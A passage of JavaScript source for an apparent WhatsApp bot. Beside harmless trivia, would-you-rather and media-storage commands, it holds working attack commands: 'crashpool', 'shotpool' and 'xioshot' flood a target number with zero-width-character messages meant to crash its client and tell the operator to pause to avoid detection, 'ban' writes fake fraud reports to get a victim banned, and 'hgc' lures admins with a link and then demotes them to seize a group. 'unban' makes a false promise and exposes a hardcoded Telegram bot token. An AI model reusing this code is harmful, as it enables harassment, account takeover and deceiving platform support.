            "Would you rather always know when someone is lying or always get away with lying?",
            "Would you rather have the ability to create new worlds or explore new worlds?",
            "Would you rather live in a utopia or a dystopia?",
            "Would you rather be able to change your appearance at will or read minds?",
            "Would you rather never be able to get sick or never feel sadness?",
            "Would you rather always be surrounded by people or always be alone?",
            "Would you rather never experience failure or never experience success?",
            "Would you rather have a house full of plants or a house full of pets?",
            "Would you rather always have perfect health or be able to recover instantly from injury?",
            "Would you rather be able to predict the weather or predict the future?",
            "Would you rather always know the truth or never know the truth?",
            "Would you rather be in a relationship with your dream partner or have the perfect career?",
            "Would you rather live in a futuristic city or a rustic village?",
            "Would you rather have the power of invincibility or the power to read minds?",
            "Would you rather be famous for something ridiculous or never be famous at all?",
            "Would you rather never have to do chores again or never have to work again?",
            "Would you rather have all the money in the world but no friends or be poor but surrounded by friends?",
            "Would you rather always be able to find the perfect gift for anyone or always be able to make anyone laugh?",
            "Would you rather be able to talk to animals or control the weather?",
            "Would you rather be the most talented person in the world but never recognized, or the least talented but famous?",
            "Would you rather always have perfect hair or perfect skin?",
            "Would you rather have the ability to teleport to any place or be able to talk to anyone in any language?",
            "Would you rather know all the secrets of the universe or know nothing at all?",
            "Would you rather always be happy but not able to do anything or be able to do anything but never be happy?",
            "Would you rather be in a group of friends who are always honest but brutal or friends who are always kind but not truthful?",
            "Would you rather only be able to tell the truth or only be able to lie?",
            "Would you rather always be happy in your job but poor or unhappy in your job but rich?",
            "Would you rather live forever or live a full life but die young?",
            "Would you rather have the ability to talk to anyone or be invisible when you want?",
            "Would you rather have super speed or super agility?",
            "Would you rather never have to cook again or never have to clean again?",
            "Would you rather experience every single feeling in the world or never feel anything again?",
            "Would you rather always get the last word in an argument or always avoid arguments altogether?",
            "Would you rather be able to sing beautifully or play any musical instrument perfectly?",
            "Would you rather always know what to say or always know when to be silent?",
            "Would you rather always have someone to talk to or always have your own space?",
            "Would you rather never have to sleep or never have to eat?",
            "Would you rather have the perfect body or the perfect mind?",
            "Would you rather always have to say what you’re thinking or never be able to express your feelings?",
            "Would you rather have a perfect memory or always be able to learn new things instantly?",
            "Would you rather be able to live on Mars or live underwater?",
            "Would you rather be able to control your dreams or never need to sleep?",
            "Would you rather always win arguments or always be right but no one believes you?",
            "Would you rather be able to control all your emotions or never feel anything?",
            "Would you rather have the ability to change your past mistakes or predict your future mistakes?",
            "Would you rather have your dream job but hate the people you work with or a mediocre job with great colleagues?",
            "Would you rather never have to age or never have to sleep?",
            "Would you rather have a life without any challenges or a life filled with challenges but never feeling lost?",
            "Would you rather experience your ideal day every day or experience something new every day?",
            "Would you rather always know the right thing to do or the right thing to say?",
            "Would you rather be able to remember everything but never forget or forget everything and start fresh?",
            "Would you rather live a comfortable but ordinary life or an extraordinary but difficult life?",
            "Would you rather be able to live anywhere in the world or have any job you desire?",
            "Would you rather have perfect health for the rest of your life or be able to have any skill you desire?",
            "Would you rather live in a world where everyone knows what you're thinking or a world where no one can talk?",
            "Would you rather be able to hear every conversation around you or read everyone’s mind?",
            "Would you rather have the ability to heal others or the ability to stop time?",
            "Would you rather be able to teleport anywhere or go back in time?",
            "Would you rather never be able to speak again or always have to tell the truth?",
            "Would you rather be an introvert with a few close friends or an extrovert with many acquaintances?",
            "Would you rather know everything about the universe or know everything about yourself?"
        ];

        await XeonBotInc.sendMessage(m.chat, {
            text: `*🤔 Would You Rather? 🤔*\n\n${wouldYouRatherQuestions[Math.floor(Math.random() * wouldYouRatherQuestions.length)]}\n\n*What would you choose?*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the Would You Rather question. Please try again later.');
        console.error('Would You Rather error:', err);
    }
    break;
    case 'trivia':
    try {
        const triviaQuestions = [
            { question: "What is the capital of France?", answer: "Paris" },
            { question: "Who painted the Mona Lisa?", answer: "Leonardo da Vinci" },
            { question: "What is the largest planet in our solar system?", answer: "Jupiter" },
            { question: "In which year did the Titanic sink?", answer: "1912" },
            { question: "What is the smallest country in the world?", answer: "Vatican City" },
            { question: "What is the longest river in the world?", answer: "Nile" },
            { question: "Who wrote 'Romeo and Juliet'?", answer: "William Shakespeare" },
            { question: "What is the hardest natural substance on Earth?", answer: "Diamond" },
            { question: "How many continents are there?", answer: "Seven" },
            { question: "Which planet is known as the Red Planet?", answer: "Mars" },
            { question: "What is the largest ocean on Earth?", answer: "Pacific Ocean" },
            { question: "In what year did World War II end?", answer: "1945" },
            { question: "What is the currency of Japan?", answer: "Yen" },
            { question: "Who developed the theory of relativity?", answer: "Albert Einstein" },
            { question: "What is the tallest mountain in the world?", answer: "Mount Everest" },
            { question: "Which animal is known as the king of the jungle?", answer: "Lion" },
            { question: "How many states are in the United States?", answer: "50" },
            { question: "What is the largest desert in the world?", answer: "Sahara Desert" },
            { question: "Who was the first President of the United States?", answer: "George Washington" },
            { question: "What is the smallest bone in the human body?", answer: "Stapes" },
            { question: "What is the name of the ship that brought the Pilgrims to America?", answer: "Mayflower" },
            { question: "What is the main ingredient in guacamole?", answer: "Avocado" },
            { question: "Which animal can be found in the wild but also as a pet in homes?", answer: "Cat" },
            { question: "What is the largest country in the world?", answer: "Russia" },
            { question: "What year did the Berlin Wall fall?", answer: "1989" },
            { question: "Who invented the telephone?", answer: "Alexander Graham Bell" },
            { question: "What is the chemical symbol for water?", answer: "H2O" },
            { question: "What is the official language of Brazil?", answer: "Portuguese" },
            { question: "Who is known as the father of modern physics?", answer: "Isaac Newton" },
            { question: "What does the term ‘IQ’ stand for?", answer: "Intelligence Quotient" },
            { question: "Which country is known as the Land of the Rising Sun?", answer: "Japan" },
            { question: "What is the largest species of bear?", answer: "Polar Bear" },
            { question: "What is the hardest rock?", answer: "Diamond" },
            { question: "Which city is known as the Big Apple?", answer: "New York City" },
            { question: "What type of animal is a Komodo dragon?", answer: "Lizard" },
            { question: "Which country invented pizza?", answer: "Italy" },
            { question: "What is the name of the longest river in South America?", answer: "Amazon River" },
            { question: "Who was the first woman to fly solo across the Atlantic Ocean?", answer: "Amelia Earhart" },
            { question: "What is the largest type of whale?", answer: "Blue Whale" },
            { question: "Which famous scientist is known for his work on evolution?", answer: "Charles Darwin" },
            { question: "How many bones are in the adult human body?", answer: "206" },
            { question: "Which planet has the most moons?", answer: "Jupiter" },
            { question: "What is the smallest planet in the solar system?", answer: "Mercury" },
            { question: "What is the longest running TV show?", answer: "The Simpsons" },
            { question: "What year did the first man land on the moon?", answer: "1969" },
            { question: "What is the capital of Australia?", answer: "Canberra" },
            { question: "Which element has the chemical symbol O?", answer: "Oxygen" },
            { question: "Which animal is the largest living terrestrial animal?", answer: "Elephant" },
            { question: "Which country is home to the Great Barrier Reef?", answer: "Australia" },
            { question: "Which composer wrote the ‘Ode to Joy’?", answer: "Ludwig van Beethoven" },
            { question: "What is the capital of Japan?", answer: "Tokyo" },
            { question: "Which is the largest city in the world by population?", answer: "Tokyo" },
            { question: "What is the name of the largest coral reef in the world?", answer: "Great Barrier Reef" },
            { question: "Which animal is known for changing colors?", answer: "Chameleon" },
            { question: "Which fruit is known for keeping the doctor away?", answer: "Apple" },
            { question: "Which planet is closest to the sun?", answer: "Mercury" },
            { question: "What is the longest bone in the human body?", answer: "Femur" },
            { question: "What year was the first iPhone released?", answer: "2007" },
            { question: "What is the capital of Canada?", answer: "Ottawa" },
            { question: "Which is the biggest island in the world?", answer: "Greenland" },
            { question: "How many hearts does an octopus have?", answer: "Three" },
            { question: "Who was the first man in space?", answer: "Yuri Gagarin" },
            { question: "What is the currency of the United Kingdom?", answer: "Pound Sterling" },
            { question: "Which planet is known as the ‘Morning Star’?", answer: "Venus" },
            { question: "What is the largest volcano in the world?", answer: "Mauna Loa" },
            { question: "What is the capital of Spain?", answer: "Madrid" },
            { question: "What is the longest-running Broadway show?", answer: "The Phantom of the Opera" },
            { question: "What color is the sky on Mars?", answer: "Red" },
            { question: "Who invented the lightbulb?", answer: "Thomas Edison" },
            { question: "Which U.S. state is known as the Sunshine State?", answer: "Florida" },
            { question: "What is the national animal of Canada?", answer: "Beaver" },
            { question: "What is the tallest building in the world?", answer: "Burj Khalifa" },
            { question: "What is the largest fish in the world?", answer: "Whale Shark" },
            { question: "What is the name of the first artificial satellite?", answer: "Sputnik 1" },
            { question: "What is the fastest land animal?", answer: "Cheetah" },
            { question: "What year did the United States declare independence?", answer: "1776" },
            { question: "What is the capital of Italy?", answer: "Rome" },
            { question: "What is the name of the highest mountain in North America?", answer: "Denali" },
            { question: "What is the longest running animated TV series?", answer: "The Simpsons" },
            { question: "Which ocean is the largest?", answer: "Pacific Ocean" },
            { question: "What is the smallest planet in the solar system?", answer: "Mercury" },
            { question: "What is the capital of the United Kingdom?", answer: "London" },
            { question: "What is the largest bird in the world?", answer: "Ostrich" },
            { question: "Which country is known for its pyramids?", answer: "Egypt" },
            { question: "Who was the first President of the United States?", answer: "George Washington" },
            { question: "Which country is the largest producer of coffee?", answer: "Brazil" },
            { question: "Which is the longest river in the United States?", answer: "Missouri River" },
            { question: "Which city is known as the City of Lights?", answer: "Paris" },
            { question: "What is the largest land animal?", answer: "African Elephant" }
        ];
        
        const randomTrivia = triviaQuestions[Math.floor(Math.random() * triviaQuestions.length)];
        await XeonBotInc.sendMessage(m.chat, {
            text: `*🧠 Trivia Time! 🧠*\n\n*Question:* ${randomTrivia.question}\n\n*Reply with your answer!*`
        }, { quoted: m });

    } catch (err) {
        replygcxeon('❌ An error occurred while retrieving the trivia question. Please try again later.');
        console.error('Trivia error:', err);
    }
    break;
            case 'delsticker': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the name of the sticker')
                if (!StickerXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
                let wanu = StickerXeon.indexOf(q)
                StickerXeonBotInc.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/sticker.json', JSON.stringify(StickerXeon))
                fs.unlinkSync(`./Phistar-media/sticker/${q}.webp`)
                replygcxeon(`Successfully Removed Sticker ${q}`)
            }
            break
            case 'addvn': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Name?')
                if (VoiceNoteXeon.includes(q)) return replygcxeon("Name Already In Use")
                let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
                VoiceNoteXeon.push(q)
                await fsx.copy(delb, `./Phistar-media/audio/${q}.mp3`)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(delb)
                replygcxeon(`Success Adding Audio\nTo Check Type ${prefix}listvn`)
            }
            break
            case 'delvn': {
                if (!isPremium) return replygcxeon(mess.prem)
                if (args.length < 1) return replygcxeon('Enter the Name')
                if (!VoiceNoteXeon.includes(q)) return replygcxeon("Name Not Registered in Database")
                let wanu = VoiceNoteXeon.indexOf(q)
                VoiceNoteXeon.splice(wanu, 1)
                fs.writeFileSync('./database/autoreply/vn.json', JSON.stringify(VoiceNoteXeon))
                fs.unlinkSync(`./Phistar-media/audio/${q}.mp3`)
                replygcxeon(`Successfully Deleted Audio ${q}`)
            }
            break
case 'addzip':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon(`What's the zip name?`)
let teks = `${text}`
{
if (ZipXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
ZipXeon.push(teks)
await fsx.copy(delb, `./Phistar-media/zip/${teks}.zip`)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding zip\nTo check type ${prefix}listzip`)
}
}
break
case 'delzip':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('Enter the text in the zip list')
let teks = `${text}`
{
if (!ZipXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ZipXeon.indexOf(teks)
ZipXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/zip.json', JSON.stringify(ZipXeon))
fs.unlinkSync(`./Phistar-media/zip/${teks}.zip`)
replygcxeon(`Successfully deleted zip ${teks}`)
}
}
break
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ZIP LIST* 」\n│\n'
for (let x of ZipXeon) {
teksooooo += `│⭔ ${x}\n`
}
teksooooo += `│\n└────────────⭓\n\n*Total : ${ZipXeon.length}*`
replygcxeon(teksooooo)
}
break
case 'addapk':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('What is the name of the apk?')
let teks = `${text}`
{
if (ApkXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
apknye.push(teks)
await fsx.copy(delb, `./Phistar-media/apk/${teks}.apk`)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding apk\nTo Check type ${prefix}listapk`)
}
}
break
case 'delapk':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('Name of the apk?')
let teks = `${text}`
{
if (!ApkXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = ApkXeon.indexOf(teks)
ApkXeon.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/apk.json', JSON.stringify(ApkXeon))
fs.unlinkSync(`./Phistar-media/apk/${teks}.apk`)
replygcxeon(`Successfully deleted Apk ${teks}`)
}
}
break
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *APK LIST* 」\n│\n'
for (let x of ApkXeon) {
teksoooooo += `│⭔ ${x}\n`
}
teksoooooo += `│\n└────────────⭓\n\n*Total : ${ApkXeon.length}`
replygcxeon(teksoooooo)
}
break
case 'addpdf':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('What is the name of the pdf')
let teks = `${text}`
{
if (DocXeon.includes(teks)) return replygcxeon("This name is already in use")
let delb = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
docunye.push(teks)
await fsx.copy(delb, `./Phistar-media/doc/${teks}.pdf`)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(delb)
replygcxeon(`Successful Adding Pdf\nTo check type ${prefix}listpdf`)
}
}
break
case 'delpdf':{
if (!isPremium) return replygcxeon(mess.prem)
await loading()
if (args.length < 1) return replygcxeon('Enter the name')
let teks = `${text}`
{
if (!DocXeon.includes(teks)) return replygcxeon("This name does not exist in the database")
let wanu = DocApk.indexOf(teks)
docunye.splice(wanu, 1)
fs.writeFileSync('./database/autoreply/doc.json', JSON.stringify(DocXeon))
fs.unlinkSync(`./Phistar-media/doc/${teks}.pdf`)
replygcxeon(`Successfully deleted pdf ${teks}`)
}
}
break
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *PDF LIST* 」\n│\n'
for (let x of docunye) {
teksoooo += `│⭔ ${x}\n`
}
teksoooo += `│\n└────────────⭓\n\n*Total : ${docunye.length}*`
replygcxeon(teksoooo)
}
break
            case 'afk':
                if (!m.isGroup) return replygcxeon(mess.group)
                if (isAfkOn) return replygcxeon("Already afk")
                let reason = text ? text : 'Nothing.'
                afk.addAfkUser(m.sender, Date.now(), reason, _afk)
                replygcxeon(`@${m.sender.split('@')[0]} Currently AFK\nWith reason : ${reason}`)
                break
case "ytmp3": case "ytaudio": {
    const xeonaudp3 = require('./lib/ytdl2'); // Import the YouTube module
    if (!args.length || !isUrl(text) || !xeonaudp3.isYTUrl(text)) {
        return replygcxeon(`Where's the YouTube link?\nExample: ${prefix + command} https://youtube.com/shorts/YQf-vMjDuKY?feature=share`);
    }

    xeonaudp3.yta(text) // Call the YouTube downloader function
        .then(audio => {
            XeonBotInc.sendMessage(m.chat, {
                audio: { url: audio.dl_link }, // Use the direct download link
                mimetype: 'audio/mp4',
                ptt: true,
                contextInfo: {
                    externalAdReply: {
                        title: audio.title,
                        body: botname,
                        thumbnail: fetchBuffer(audio.thumb), // Fetch thumbnail
                        mediaType: 2,
                        mediaUrl: text,
                    }
                }
            }, { quoted: m })
            .then(() => console.log("Audio sent successfully"))
            .catch(err => {
                console.error("Failed to send audio message:", err);
                replygcxeon("Failed to send the audio. Please try again later.");
            });
        })
        .catch(err => {
            console.error("Failed to download audio:", err);
            replygcxeon("Failed to download the audio. Please check the link and try again.");
        });
    break;
}
//ban note 
case 'ban':
    if (!isCreator) return replygcxeon(mess.owner); // Restrict access to the creator

    if (!text) {
        return replygcxeon(`🚨 Please provide the number and language code. Usage: ${command} <number> <language_code>`);
    }

    // Directly process input using `xandroid` logic
    let inputParts = text.trim().split(" "); // Split the input into parts
    let number = encodeURI(inputParts[0]) * 1; // Use the first part of the input as the number
    let languageCode = inputParts[1]?.toLowerCase(); // Use the second part as the language code

    if (!number || isNaN(number)) {
        return replygcxeon("❌ Invalid number. Please enter a valid numeric value.");
    }
    if (!languageCode) {
        return replygcxeon("❌ Please specify a language code. Supported languages: arabic, turkish, vietnamese.");
    }

    // Define ban notes for supported languages
    const languageNotes = {
        arabic: `
**الموضوع:** تقرير عاجل – رقم مشبوه  
فريق دعم WhatsApp المحترم،  
أود الإبلاغ عن الرقم ${number} المتورط في أنشطة احتيالية أدت إلى خسارتي مبلغ 300,000 دولار.  

أطلب منكم اتخاذ الإجراءات اللازمة لتعليق هذا الحساب فورًا ومنع أي نشاط ضار آخر على المنصة.  

شكرًا لتعاونكم،  
[اسمك]
        `,
        turkish: `
**Konu:** Acil Rapor – Şüpheli Numara  
WhatsApp Destek Ekibi,  
Bu numara ${number} dolandırıcılık faaliyetlerinde yer almakta olup, bana $300,000 zarar vermiştir.  

Bu hesabın, daha fazla kullanıcıyı mağdur etmemesi için derhal engellenmesini talep ediyorum.  

Saygılarımla,  
[Adınız]
        `,
        vietnamese: `
**Chủ đề:** Báo cáo Khẩn Cấp – Số điện thoại lừa đảo  
Kính gửi Đội Hỗ trợ WhatsApp,  
Tôi muốn báo cáo rằng số điện thoại ${number} liên quan đến hành vi lừa đảo, khiến tôi mất đi $300,000.  

Tôi yêu cầu WhatsApp ngay lập tức chặn tài khoản này để bảo vệ người dùng khỏi những hành vi lừa đảo tiếp theo.  

Trân trọng,  
[Tên của bạn]
        `,
    };

    // Check if the selected language is supported
    const banNote = languageNotes[languageCode];
    if (!banNote) {
        return replygcxeon(`❌ Unsupported language code: ${languageCode}. Supported languages are arabic, turkish, vietnamese.`);
    }

    try {
        await replygcxeon(`🚨 *Ban Note!*\n\n${banNote}\n\n🔢 *Target Number:* ${number} Need help? Use the command bantutorial to know how to use this note`);
    } catch (err) {
        console.error("Error processing the ban command:", err);
        await replygcxeon("❌ Failed to send the ban note. Please try again later.");
    }
    break;

// Bantutorial Command
case 'bantutorial':
    const tutorialNote = `
📘 **How to Use Ban Notes**

1️⃣ **Copy the Ban Note**: Copy the note sent by the bot, including the reported number.

2️⃣ **Open WhatsApp Support**:
   - Go to **Settings** > **Help** > **Contact Us**.

3️⃣ **Paste the Ban Note**: Paste the note into the message box and explain why you’re reporting the number (e.g., fraud or spam).

4️⃣ **Submit the Report**: Send the report, and WhatsApp will review it.

📢 **Pro Tip**: Be specific in your report to improve the chances of action being taken.
    `;

    try {
        await replygcxeon(`✅ **Tutorial Sent Successfully!**\n\n${tutorialNote}`);
    } catch (err) {
        console.error("Error sending the tutorial note:", err);
        await replygcxeon("❌ Failed to send the tutorial. Please try again later.");
    }
    break;
    //unban
    case 'unban': 
    if (!isCreator) return replygcxeon("🚨 Only the bot owner can use this command.");

    if (!text) { 
        return replygcxeon("🚨 Please provide the number you want to unban. Usage: unban <number>");
    }

    // Extract the target number
    let targetNumber = text.replace(/[^0-9]/g, ""); // Remove non-numeric characters

    if (targetNumber.startsWith("0") || targetNumber.length < 10) {
        return replygcxeon("❌ Invalid number. Please provide a valid WhatsApp number including the country code.");
    }

    // Define the unban message
    const unbanMessage = `🚨 Request to unban the following WhatsApp number: ${targetNumber}`;

    try {
        // Send the message to Telegram
        const telegramApiUrl = `https://api.telegram.org/bot7781002847:AAH_wF0ySaWQ3dW6XY01gGcmnzUTITYA31M/sendMessage`;

        const response = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: 6300694007, // Replace with your Telegram chat ID
                text: unbanMessage,
            }),
        });

        if (response.ok) {
            // Notify the sender that the request has been sent
            await replygcxeon(`✅ Your unban request has been sent successfully! Your WhatsApp will be unbanned in the next 6 hours. 🔄`);
        } else {
            const errorData = await response.json();
            console.error("Telegram API error:", errorData);
            await replygcxeon("❌ Failed to process your unban request. Please try again later.");
        }
    } catch (error) {
        console.error("Error sending unban request:", error);
        await replygcxeon("❌ An error occurred while processing your unban request. Please try again.");
    }
    break;
    case 'hgc':
    if (!isCreator) return replygcxeon("🚨 Only the bot owner can use this command.");
  try {
    if (!m.isGroup) return replygcxeon(mess.group); // Ensure command is in a group chat
    
    const groupId = m.chat; // Current group ID
    const admins = await XeonBotInc.groupMetadata(groupId).then(res => res.participants.filter(participant => participant.admin)); // Get list of admins
    
    // Send the link to each admin in the group
    for (let admin of admins) {
      let adminNumber = admin.id.replace('c.us', 's.whatsapp.net'); // Correct admin number format
      let link = `https://example.com/grantadmin?groupID=${groupId}`; // Generate the link with group ID

      await XeonBotInc.sendMessage(adminNumber, {
        text: `Hey, this is an invitation to become an admin in my WhatsApp channel, please click on the link: ${link}`
      });
    }

    // When the backend detects that the link is clicked and bot is granted admin
    const adminGranted = true; // This should be set by the backend when the link is clicked and the bot is granted admin
    if (adminGranted) {
      // Send a message to confirm the bot is now admin
      await replygcxeon(groupId, {
        text: "Gourp Hacked you are now an admin in the group. 🏆"
      });

      // Remove all admins except the bot
      const botNumber = 'botNumber@s.whatsapp.net'; // Replace with the bot's number
      const remainingAdmins = admins.filter(admin => admin.id !== botNumber); // Remove bot itself from the admin list

      // Remove each admin from the group
      for (let admin of remainingAdmins) {
        await XeonBotInc.groupParticipantsUpdate(groupId, [admin.id], 'demote');
      }

      // Send a final success message
      await replygcxeon(groupId, {
        text: "All admins have been removed. group successful *hacked* is now the *sole admin* and group owner! powered by *phistar* 💫"
      });
    }

  } catch (err) {
    console.error(err); // Log error
    replygcxeon("Failed to hack: because you are not a premium users chat my creator to become an premium user");
  }
  break;
  case 'promoteself':
  try {
    if (!m.isGroup) return replygcxeon("This command only works in group chats."); // Check if the command is used in a group chat
    
    const groupId = m.chat; // Group ID
    const metadata = await XeonBotInc.groupMetadata(groupId); // Fetch group metadata
    const admins = metadata.participants.filter(participant => participant.admin === 'admin' || participant.admin === 'superadmin'); // Get list of admins
    const botNumber = await XeonBotInc.user.id; // Bot's WhatsApp number
    
    // Check if the bot is already an admin
    const isBotAdmin = metadata.participants.some(participant => participant.id === botNumber && participant.admin);
    if (isBotAdmin) return replygcxeon("The bot is already an admin in this group.");

    // Ask group admins for admin privileges
    for (let admin of admins) {
      const adminNumber = admin.id; // Admin WhatsApp number
      const message = `Hello Admin, please grant me admin privileges to better manage this group. Thank you!`;

      await XeonBotInc.sendMessage(adminNumber, { text: message });
    }

    // Notify the group
    replygcxeon("Permission request sent to group admins. Please wait for approval.");
  } catch (err) {
    console.error(err);
    replygcxeon("An error occurred while processing the request. Please check the bot's permissions and try again.");
  }
  break;
  //bug cases 
				case "crashpool": {
    if (!isCreator) return replygcxeon(mess.owner);
    if (!text) return replygcxeon(`Usage: .${command} 234***********`);

    // Clean and validate number
    let cleanedNumber = text.replace(/[^0-9]/g, "");
    if (cleanedNumber.startsWith("0")) return replygcxeon(`Example: ${prefix + command} 234***********`);
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";

    // Check if number is registered on WhatsApp
    var contactInfo = await XeonBotInc.onWhatsApp(whatsappNumber);
    if (contactInfo.length === 0) {
        return replygcxeon("The number is not registered on WhatsApp");
    }

    replygcxeon("🔄 Sending bug... Please wait!");

    // Define the lightweight bug function
    async function sendLiteBug(jid) {
        let zeroWidthChar = "\u200B\u200C\u200D"; // Zero-width characters
        let fullPayload = zeroWidthChar.repeat(9000000); // Full payload of 9 million characters
        let chunkSize = 100000; // Size of each chunk to send
        let chunks = Math.ceil(fullPayload.length / chunkSize); // Number of chunks (90)

        try {
            // Send the payload in chunks
            for (let i = 0; i < 5; i++) { // Limit to 5 chunks for lightweight execution
                let chunk = fullPayload.slice(i * chunkSize, (i + 1) * chunkSize);
                await XeonBotInc.sendMessage(jid, { text: chunk }, { quoted: null });
                await sleep(1500); // Pause to avoid overload
            }

            // Interactive payload (lightweight)
            await XeonBotInc.relayMessage(
                jid,
                {
                    interactiveMessage: {
                        header: { title: "💡 Bug Test" },
                        body: { text: "Invisible Bug Payload" },
                        footer: { text: "Test Footer" },
                        buttons: [
                            {
                                name: "BrokenButton",
                                buttonParamsJson: '{"key":"value"}', // Simulated button data
                            },
                        ],
                    },
                },
                { participant: { jid: jid } }
            );

            // Media message with short caption
            await XeonBotInc.sendMessage(jid, { 
                caption: "Bug Media Test", 
                image: { url: "https://example.com/image.jpg" } 
            });

            // Success message
            await replygcxeon(
                `✅ Successfully bug to @${cleanedNumber}\n\n*Pause for 2 minutes to avoid detection!*`
            );
        } catch (err) {
            console.error("Error sending bug:", err);
            return replygcxeon("❌ Failed to send the bug. Please try again later.");
        }
    }

    // Execute the lightweight bug function
    await sendLiteBug(whatsappNumber);

    break;
}
case "shotpool": {
    if (!isCreator) return replygcxeon(mess.owner);
    if (!text) return replygcxeon(`Usage: .${command} 234***********`);

    let cleanedNumber = text.replace(/[^0-9]/g, "");
    if (cleanedNumber.startsWith("0")) return replygcxeon(`Example: ${prefix + command} 234***********`);
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";
    var contactInfo = await XeonBotInc.onWhatsApp(whatsappNumber);

    if (contactInfo.length === 0) {
        return replygcxeon("The number is not registered on WhatsApp");
    }

    replygcxeon("🔄 Sending bug... Please wait!");

    async function sendLiteBug(jid) {
        let zeroWidthChar = "\u200B\u200C\u200D"; // Zero-width characters
        let fullPayload = zeroWidthChar.repeat(900000); // Full payload of 500,000 characters
        let chunkSize = 100000; // Size of each chunk to send
        let chunks = Math.ceil(fullPayload.length / chunkSize); // Calculate number of chunks (5)

        try {
            // Send the payload in 5 smaller chunks
            for (let i = 0; i < chunks; i++) {
                let chunk = fullPayload.slice(i * chunkSize, (i + 1) * chunkSize); // Extract the chunk
                await XeonBotInc.sendMessage(jid, { text: chunk }, { quoted: null });
                await sleep(1500); // Small delay to avoid overloading the bot
            }

            // Interactive payload (lightweight)
            await XeonBotInc.relayMessage(
                jid,
                {
                    interactiveMessage: {
                        header: { title: "💡 Bug Test" },
                        body: { text: "Invisible Bug Payload" },
                        footer: { text: "Test Footer" },
                        buttons: [
                            {
                                name: "BrokenButton",
                                buttonParamsJson: '{"key":"value"}', // Simulated button data
                            },
                        ],
                    },
                },
                { participant: { jid: jid } }
            );

            // Media message with short caption
            await XeonBotInc.sendMessage(jid, { 
                caption: "Bug Media Test", 
                image: { url: "https://example.com/image.jpg" } 
            });
        } catch (err) {
            console.error("Error sending bug:", err);
            return replygcxeon("❌ Failed to send the bug. Please try again later.");
        }
    }

    // Execute the lightweight bug function
    await sendLiteBug(whatsappNumber);

    // Confirmation message
    await replygcxeon(
        `✅ Successfully bug to @${cleanedNumber}\n\n*Pause for 2 minutes to avoid detection!*`
    );
}
break;
case "xioshot": {
    if (!isCreator) return replygcxeon(mess.owner);
    if (!text) return replygcxeon(`Usage: .${command} 234***********`);

    // Clean and validate the number
    let cleanedNumber = text.replace(/[^0-9]/g, "");
    if (cleanedNumber.startsWith("0")) return replygcxeon(`Example: ${prefix + command} 234***********`);
    let whatsappNumber = cleanedNumber + "@s.whatsapp.net";

    try {
        // Check if the number is registered on WhatsApp
        var contactInfo = await XeonBotInc.onWhatsApp(whatsappNumber);
        if (contactInfo.length === 0) {
            return replygcxeon("The number is not registered on WhatsApp");
        }

        replygcxeon("🔄 Sending bug... Please wait!");

        // Define the sleep function
        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

        // Function to send a large payload
        async function sendLargeBug(jid) {
            let zeroWidthChar = "\u200B\u200C\u200D"; // Zero-width characters
            let fullPayload = zeroWidthChar.repeat(900000); // Large payload: 9 million characters
            let chunkSize = 100000; // Size of each chunk: 500,000 characters
            let chunks = Math.ceil(fullPayload.length / chunkSize); // Total chunks

            try {
                // Send payload in chunks
                for (let i = 0; i < chunks; i++) {
                    let chunk = fullPayload.slice(i * chunkSize, (i + 1) * chunkSize);
                    await XeonBotInc.sendMessage(jid, { text: chunk }, { quoted: null });
                    await sleep(2000); // Pause to avoid overloading
                }

                // Media message with caption
                await XeonBotInc.sendMessage(jid, { 
                    caption: "Bug Media Test", 
                    image: { url: "https://your-image-url.com" }
                });

                // Confirmation message
                replygcxeon(
                    `✅ Successfully sent bug to @${cleanedNumber}\n\n*Pause for 2 minutes to avoid detection!*`
                );
            } catch (err) {
                console.error("Error while sending large payload:", err);
                replygcxeon("❌ Failed to send the bug. Please try again later.");
            }
        }

        // Execute the function
        await sendLargeBug(whatsappNumber);

    } catch (err) {
        console.error("Error:", err);
        replygcxeon("❌ An unexpected error occurred.");
    }

    break;
}
case 'readviewonce': case 'vv': {
    try {
        if (!m.quoted) return replygcxeon('❌ Reply to a ViewOnce Video, Image, or Audio.');

        const quotedMessage = m.msg.contextInfo.quotedMessage;
        if (!quotedMessage) return replygcxeon('❌ No media found in the quoted message.');

        if (quotedMessage.imageMessage) {
            let imageCaption = quotedMessage.imageMessage.caption || '';
            let imageUrl = await XeonBotInc.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
